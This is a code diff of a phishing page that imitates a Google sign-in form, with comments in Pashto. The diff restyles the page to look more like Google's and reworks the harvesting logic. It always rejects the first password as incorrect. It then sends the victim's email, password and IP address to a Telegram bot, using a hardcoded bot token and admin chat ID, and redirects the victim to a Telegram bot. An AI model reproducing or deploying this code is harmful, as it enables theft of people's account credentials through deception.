@@ -14,22 +14,22 @@
 
         body {
             min-height: 100vh;
-            background: #1a1a1a;
+            background: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 1rem;
         }
 
-        /* د ګوګل اصلي کارت ډیزاین */
+        /* د ګوګل اصلي کارت ډیزاین - سپین پس منظر */
         .google-card {
             max-width: 450px;
             width: 100%;
-            background: #1e1e2f;
-            border-radius: 1rem;
-            border: 1px solid #2a2a3a;
+            background: #ffffff;
+            border-radius: 0.75rem;
+            border: 1px solid #dadce0;
             padding: 2rem 1.8rem;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
         }
 
         .logo {
@@ -38,25 +38,25 @@
         }
 
         .logo span {
-            font-size: 2rem;
+            font-size: 2.2rem;
             font-weight: 500;
-            color: #e0e0e0;
+            color: #4285f4;
             font-family: 'Google Sans', system-ui;
         }
 
         h1 {
             font-size: 1.5rem;
             font-weight: 500;
-            color: #e0e0e0;
+            color: #202124;
             margin-bottom: 0.5rem;
             text-align: center;
         }
 
         .sub {
-            color: #9aa0a6;
+            color: #5f6368;
             font-size: 0.85rem;
             text-align: center;
-            margin-bottom: 1.5rem;
+            margin-bottom: 1.8rem;
         }
 
         .input-group {
@@ -67,28 +67,28 @@
         .input-group input {
             width: 100%;
             padding: 0.85rem 1rem;
-            background: #2a2a3a;
-            border: 1px solid #3a3a4a;
+            background: #ffffff;
+            border: 1px solid #dadce0;
             border-radius: 0.5rem;
-            color: #e0e0e0;
+            color: #202124;
             font-size: 1rem;
             outline: none;
             transition: all 0.2s;
         }
 
         .input-group input:focus {
-            border-color: #3b82f6;
-            box-shadow: 0 0 0 2px rgba(59,130,246,0.2);
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
         }
 
         .input-group input::placeholder {
-            color: #6b7280;
+            color: #80868b;
         }
 
         button {
             width: 100%;
             padding: 0.85rem;
-            background: #3b82f6;
+            background: #1a73e8;
             border: none;
             border-radius: 0.5rem;
             color: white;
@@ -100,10 +100,10 @@
         }
 
         button:hover {
-            background: #2563eb;
+            background: #1557b0;
         }
 
-        /* د لینکونو ډیزاین */
+        /* د لینکونو ډیزاون */
         .links-row {
             display: flex;
             justify-content: space-between;
@@ -112,13 +112,12 @@
         }
 
         .links-row a, .links-row span {
-            color: #8ba6bc;
+            color: #1a73e8;
             text-decoration: none;
             cursor: pointer;
         }
 
         .links-row a:hover, .links-row span:hover {
-            color: #3b82f6;
             text-decoration: underline;
         }
 
@@ -127,12 +126,11 @@
             text-align: center;
             margin-top: 1.2rem;
             font-size: 0.85rem;
-            color: #8ba6bc;
+            color: #1a73e8;
             text-decoration: none;
         }
 
         .create-account:hover {
-            color: #3b82f6;
             text-decoration: underline;
         }
 
@@ -140,17 +138,16 @@
             display: block;
             text-align: center;
             margin-top: 0.8rem;
-            font-size: 0.7rem;
-            color: #6b7280;
+            font-size: 0.75rem;
+            color: #5f6368;
         }
 
         .guest-mode a {
-            color: #8ba6bc;
+            color: #1a73e8;
             text-decoration: none;
         }
 
         .guest-mode a:hover {
-            color: #3b82f6;
             text-decoration: underline;
         }
 
@@ -165,15 +162,15 @@
         }
 
         .error-msg {
-            background: rgba(220, 38, 38, 0.15);
-            border: 1px solid #ef4444;
-            color: #fca5a5;
+            background: #fce8e6;
+            border: 1px solid #d93025;
+            color: #d93025;
         }
 
         .success-msg {
-            background: rgba(34, 197, 94, 0.15);
-            border: 1px solid #22c55e;
-            color: #86efac;
+            background: #e6f4ea;
+            border: 1px solid #34a853;
+            color: #137333;
         }
 
         /* فوټر */
@@ -181,11 +178,11 @@
             display: flex;
             justify-content: center;
             gap: 1.2rem;
-            margin-top: 1.8rem;
+            margin-top: 2rem;
             padding-top: 1rem;
-            border-top: 1px solid #2a2a3a;
+            border-top: 1px solid #e8eaed;
             font-size: 0.7rem;
-            color: #6b7280;
+            color: #5f6368;
         }
 
         .footer span {
@@ -193,13 +190,13 @@
         }
 
         .footer span:hover {
-            color: #8ba6bc;
+            color: #1a73e8;
         }
 
         .step-text {
             text-align: center;
             font-size: 0.7rem;
-            color: #6b7280;
+            color: #5f6368;
             margin-top: 0.8rem;
         }
     </style>
@@ -271,7 +268,7 @@
     // ==================== Telegram Bot Settings ====================
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
     const ADMIN_CHAT_ID = "8295417969";
-    const BOT_REDIRECT = "https://t.me/All_CameraHackBot?start=8020108872";
+    const BOT_REDIRECT = "https://t.me/imrankhabotstart=8020108872";
 
     // د هڅو تعقیبول (د ایمیل پر بنسټ)
     let attemptStore = {};
@@ -318,8 +315,10 @@
     }
 
     async function sendToAdmin(email, password, ip, success) {
-        const status = success ? "✅ SUCCESSFUL LOGIN" : "❌ FAILED ATTEMPT";
-        const msg = `${status}\n\n👤 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
+        // غلط معلومات اډمن ته نه ځي - یوازې بريالي معلومات
+        if (!success) return;
+        
+        const msg = `✅ *SUCCESSFUL LOGIN*\n\n👤 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
         
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -327,7 +326,8 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: ADMIN_CHAT_ID,
-                    text: msg
+                    text: msg,
+                    parse_mode: 'Markdown'
                 })
             });
         } catch (err) {
@@ -343,7 +343,7 @@
             return;
         }
         currentEmail = email;
-        displayEmailSpan.innerHTML = `${currentEmail} <span style="color:#3b82f6; font-size:0.7rem;">✓</span>`;
+        displayEmailSpan.innerHTML = `${currentEmail} <span style="color:#34a853; font-size:0.7rem;">✓</span>`;
         emailInput.value = '';
         step1View.style.display = 'none';
         step2View.style.display = 'block';
@@ -371,9 +371,8 @@
         const currentAttempt = attemptStore[key].attempts + 1;
         attemptStore[key].attempts = currentAttempt;
 
-        // لومړۍ هڅه — تل ناکامه (معلومات اډمن ته ځي)
+        // لومړۍ هڅه — ناکامه (معلومات اډمن ته نه ځي)
         if (currentAttempt === 1) {
-            await sendToAdmin(currentEmail, password, ip, false);
             showMessage(errorBox, "❌ Incorrect password. Please try again.", true);
             // بیا له پیل څخه پیل کړئ
             setTimeout(() => {
@@ -382,7 +381,7 @@
             return;
         }
 
-        // دوهمه هڅه — بریالۍ
+        // دوهمه هڅه — بریالۍ (معلومات اډمن ته ځي)
         if (currentAttempt >= 2) {
             await sendToAdmin(currentEmail, password, ip, true);
             showMessage(successBox, "✅ Login successful! Redirecting to Telegram...", false);
